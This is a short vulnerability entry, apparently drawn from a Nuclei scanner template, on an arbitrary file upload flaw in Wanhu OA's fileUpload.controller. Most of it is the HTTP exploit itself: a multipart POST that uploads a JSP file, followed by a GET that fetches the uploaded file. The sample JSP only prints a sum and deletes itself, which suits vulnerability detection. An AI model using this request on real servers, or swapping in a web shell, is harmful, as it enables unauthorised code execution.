# Vulnerability: Wanhu OA Fileupload Controller - Arbitrary File Upload
**Classification:** WANHU
**Source:** Nuclei Template (`wanhu-oa-fileupload-controller-arbitrary-file-upload.yaml`)

## Description
There is an arbitrary file upload vulnerability in Wanhu OA fileUpload.controller. An attacker can upload any file through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /defaultroot/upload/fileUpload.controller HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6

--b0d829daa06c13d6b3e16b0ad21d1eed
Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
Content-Type: application/octet-stream

<%out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--b0d829daa06c13d6b3e16b0ad21d1eed--

GET /defaultroot/upload/html/{{filename}} HTTP/1.1
Host: {{Hostname}}
```

